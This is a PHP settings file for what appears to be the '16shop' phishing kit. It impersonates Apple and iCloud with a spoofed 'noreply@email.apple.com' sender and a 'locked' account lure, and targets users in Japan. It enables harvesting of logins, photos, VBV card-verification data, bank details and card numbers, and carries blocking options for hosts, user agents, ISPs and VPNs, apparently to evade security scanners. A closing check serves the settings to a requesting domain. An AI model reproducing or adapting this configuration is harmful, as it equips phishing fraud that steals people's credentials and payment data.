<?php
$data = array(
    "email_result" => "", // your email
    "lock_platform" => "",
    "sender_mail" => "noreply@email.apple.com",
    "site_parameter" => "16shop",
    "site_password" => "",
    "lock_country" => "Japan",
    "site_param_on" => "",
    "site_pass_on" => "",
    "send_login" => "on", // on or off
    "mix_result" => "",
    "get_photo" => "on",
    "get_vbv" => "on",
    "get_email" => "",
    "get_bank" => "",
    "double_cc" => "",
    "onetime" => "on",
    "encrypt_html" => "",
    "block_host" => "",
    "block_ua" => "",
    "block_iprange" => "",
    "block_isp" => "",
    "block_vpn" => "",
    "theme" => "icloud", // icloud or apple
    "letter" => "locked",
    "mix_email" => "",
    "block_referrer" => ""
);

if (gethostbyname($_POST['domain']) === $_SERVER['REMOTE_ADDR']) {
    echo json_encode($data);
}